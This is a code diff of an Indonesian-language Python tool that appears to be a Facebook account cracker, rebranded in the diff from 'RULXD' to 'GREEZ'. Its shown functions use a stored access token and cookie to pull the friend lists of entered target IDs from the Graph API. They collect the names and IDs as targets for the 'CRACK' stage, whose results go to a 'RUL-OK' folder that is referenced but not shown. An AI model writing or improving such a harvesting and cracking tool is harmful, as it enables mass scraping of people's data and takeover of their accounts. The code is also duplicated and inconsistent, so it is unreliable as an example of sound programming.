@@ -267,7 +267,7 @@ def menu():
 	CYXIEON_GANTENG = input(f'{hijo}└──[{puti} Input menu : ')
 	if CYXIEON_GANTENG in ['01','1']:
 	        idt = input('└──[ ID Target : ')
-	        dump(idt, "", {"cookie":cok}, token)
+	        dump(idt,"",{"cookie":cok},token)
 	if CYXIEON_GANTENG in ['02','2']:
 	        dump_massal()
 	elif CYXIEON_GANTENG in ['03','3']:
@@ -278,100 +278,6 @@ def menu():
             ganti_cokies()
 
 ###-----[ DUMP PUBLIK ]-----###
-def dummp(idt, fields, cookie, token):
-    try:
-        headers = {
-            "connection": "keep-alive",
-            "accept": "*/*",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-user": "?1",
-            "sec-ch-ua-mobile": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
-            "accept-encoding": "gzip, deflate",
-            "accept-language": "id-ID,id;q=0.9",
-        }
-        if len(id) == 0:
-            params = {
-                "access_token": token,
-                "fields": f"name,friends.fields(id,name,birthday)",
-            }
-        else:
-            params = {
-                "access_token": token,
-                "fields": f"name,friends.fields(id,name,birthday).after({fields})",
-            }
-        url = ses.get(
-            f"https://graph.facebook.com/{idt}",
-            params=params,
-            headers=headers,
-            cookies=cookie,
-        ).json()
-        for i in url["friends"]["data"]:
-            # print(i["id"]+"|"+i["name"])
-            id.append(i["id"] + "|" + i["name"])
-            sys.stdout.write(f"\r sedang dump... {len(id)}"),
-            sys.stdout.flush()
-        dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
-    except:
-        pass
-    atur_id()
-####---------------[ DUMP MASSAL ]----------------]####
-def massalx():
-	token = open('.token.txt','r').read()
-	cok = open('.cok.txt','r').read()
-	try:
-		kumpulkan = int(input(f'>>> {H}Mau Berapa ID ?{P} : '))
-	except ValueError:
-	    exit()
-	if kumpulkan<1 or kumpulkan>1000:
-	    exit()
-	ses=requests.Session()
-	bilangan = 0
-	for KOTG49H in range(kumpulkan):
-		bilangan+=1
-		Masukan = input(f">>> {H}Masukan Idz Ke {P}" +str(bilangan)+f' : ')
-		uid.append(Masukan)
-	for user in uid:
-	    try:
-	       headers = (
-	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
-	       })
-	       if len(id) == 0:
-	           params = (
-	           {
-	           'access_token': token,
-	           'fields': "friends"
-	           }	          
-	       )
-	       else:
-	           params = (
-	           {
-	           'access_token': token,
-	           'fields': "friends"
-	           }	           
-	       )
-	       url = requests.get('https://graph.facebook.com/{user}'.format(user), params=params, headers=headers, cookies={'cookies':cok}).json()
-	       for xr in url['friends']['data']:
-	           try:
-	               woy = (xr['id']+'|'+xr['name'])
-	               if woy in id:pass
-	               else:id.append(woy)
-	           except:continue
-	    except (KeyError,IOError):
-	      pass
-	    except requests.exceptions.ConnectionError:
-	       exit()
-	try:
-	      print("Total DUMP  : "+str(len(id))) 
-	      atur_id()
-	except requests.exceptions.ConnectionError:
-	    exit()
-	except (KeyError,IOError):
-		exit() 
-#----------[ CRACK-MASSAL ]----------#    
 def dump_massal():
 	try:
 		token = open('.token.txt','r').read()
@@ -388,7 +294,7 @@ def dump_massal():
 	bilangan = 0
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
-		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] RULXD [/]]",style=f"bold green"))
+		prints(panel(f'[cyan]       Masukkan ID Satu Persatu! ',width=43,title=f"[[green] GREEZ [/]]",style=f"bold white"))
 		Masukan = input(f' Masukin ID Yang Ke  '+str(bilangan)+f' : ')
 		uid.append(Masukan)
 	for user in uid:
@@ -410,7 +316,7 @@ def dump_massal():
 	           'fields': "friends"
 	           }	           
 	       )
-	       url = requests.get('https://graph.facebook.com/{uid}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
 	       for xr in url['friends']['data']:
 	           try:
 	               woy = (xr['id']+'|'+xr['name'])
@@ -421,172 +327,15 @@ def dump_massal():
 	      pass
 	    except requests.exceptions.ConnectionError:
 	        exit()
-	try: 
-	    prints(panel(f"{puti} sedanng mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]RULXD[/]]",style=f"bold green"))
-	    atur_id()
+	try:
+	      prints(panel(f"…⁠ᘛ⁠⁐̤⁠ᕐ⁠ᐷ lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]GREEZ[/]]",style=f"bold white"))
+	      atur_id()
 	except requests.exceptions.ConnectionError:
 	    exit()
 	except (KeyError,IOError):
 		exit()
-#-------------------[ CRACK-PENGIKUT ]----------------#
-def dump_asep():
-    try:
-        token = open(".token.txt", "r").read()
-        cok = open(".cok.txt", "r").read()
-    except IOError:
-        exit()
-    try:
-        kumpulkan = int(input(f">> {H}Mau Berapa Id?{N} : "))
-    except ValueError:
-        exit()
-    if kumpulkan < 1 or kumpulkan > 1000:
-        exit()
-    ses = requests.Session()
-    bilangan = 0
-    for KOTG49H in range(kumpulkan):
-        bilangan += 1
-        Masukan = input(f">> {H}Masukkan Id Yang Ke {N}" + str(bilangan) + f" : ")
-        uid.append(Masukan)
-    for user in uid:
-        try:
-            head = {
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
-            }
-            if len(id) == 0:
-                params = {"access_token": token, "fields": "friends"}
-            else:
-                params = {"access_token": token, "fields": "friends"}
-            url = requests.get(
-                "https://graph.facebook.com/{}".format(user),
-                params=params,
-                headers=head,
-                cookies={"cookies": cok},
-            ).json()
-            for xr in url["friends"]["data"]:
-                try:
-                    woy = xr["id"] + "|" + xr["name"]
-                    if woy in id:
-                        pass
-                    else:
-                        id.append(woy)
-                except:
-                    continue
-        except (KeyError, IOError):
-            pass
-        except requests.exceptions.ConnectionError:
-            exit()
-    try:
-        print("Total Id : " + str(len(id)))
-        atur_id()
-    except requests.exceptions.ConnectionError:
-        exit()
-    except (KeyError, IOError):
-        exit()
-#-----------------[ DUMP PUBLIK ]-----------------#
-def dumpp(idt, fields, cookie, token):
-    try:
-        headers = {
-            "connection": "keep-alive",
-            "accept": "*/*",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-user": "?1",
-            "sec-ch-ua-mobile": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
-            "accept-encoding": "gzip, deflate",
-            "accept-language": "id-ID,id;q=0.9",
-        }
-        if len(id) == 0:
-            params = {
-                "access_token": token,
-                "fields": f"name,friends.fields(id,name,birthday)",
-            }
-        else:
-            params = {
-                "access_token": token,
-                "fields": f"name,friends.fields(id,name,birthday).after({fields})",
-            }
-        url = ses.get(
-            f"https://graph.facebook.com/{idt}",
-            params=params,
-            headers=headers,
-            cookies=cookie,
-        ).json()
-        for i in url["friends"]["data"]:
-            # print(i["id"]+"|"+i["name"])
-            id.append(i["id"] + "|" + i["name"])
-            sys.stdout.write(f"\r sedang dump... {len(id)}"),
-            sys.stdout.flush()
-        dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
-    except:
-        pass
-#-------------------[ CRACK-PUBLIK ]----------------#
-def dump_massal():
-	try:
-		token = open('.tok.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		jum = int(input(f'[{h}•{x}] Masukkan Jumlah Target : '))
-	except ValueError:
-		print('└─ wrong input ')
-		exit()
-	if jum<1 or jum>100:
-		print('└─ Failed Dump Id maybe id is not public ')
-		exit()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input(f'[{h}+{x}] Target '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			headers = {
-			"connection": "keep-alive",
-			"accept": "*/*",
-			"sec-fetch-dest": "empty",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-site": "same-origin",
-			"sec-fetch-user": "?1",
-			"sec-ch-ua-mobile": "?1",
-			"upgrade-insecure-requests": "1",
-			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
-			"accept-encoding": "gzip, deflate",
-			"accept-language": "id-ID,id;q=0.9"
-			}
-			params = {
-			"access_token": token,
-			"fields": f"name,friends.fields(id,name,birthday)"
-			}
-			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+token[0], params = params, headers = headers, cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print('└─ unstable signal ')
-			exit()
-	try:
-		print(f' Target Terkumpul : '+str(len(id)))
-		atur_id()
-	except requests.exceptions.ConnectionError:
-		print(f'{x}')
-		print('└─ unstable signal ')
-		back()
-	except (KeyError,IOError):
-		print(f'└─{k} Friendship Not Public {x}')
-		time.sleep(3)
-		back()
 #----------[ CRACK-PUBLIK  ]----------#            
-def dump(idt, fields, cookie, token):
+def dump(idt,fields,cookie,token):
 	try:
 		headers = {
 			"connection": "keep-alive", 
@@ -613,14 +362,14 @@ def dump(idt, fields, cookie, token):
 			}
 		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
 		for i in url["friends"]["data"]:
-			print(i["id"]+"|"+i["name"])
+			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
 			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
 			sys.stdout.flush()
-		dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
+		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
+	atur_id()
 	      
-
 #----------[ HASIL-OK ]----------#            
 def hasil_ok():
 	try:vin = os.listdir('RUL-OK')
